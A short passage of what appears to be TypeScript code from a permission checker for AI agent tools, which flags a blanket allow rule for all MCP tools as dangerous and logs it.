  // 5. Blanket MCP agent allow (toolName starts with mcp__ and no content)
  if (toolName.startsWith('mcp__') && !ruleContent) {
    logger.debug(
      backgroundCtx(),
      `Dangerous rule detected: blanket MCP agent allow, toolName=${toolName}`,
    );
    return true;
  }

  return false;
}
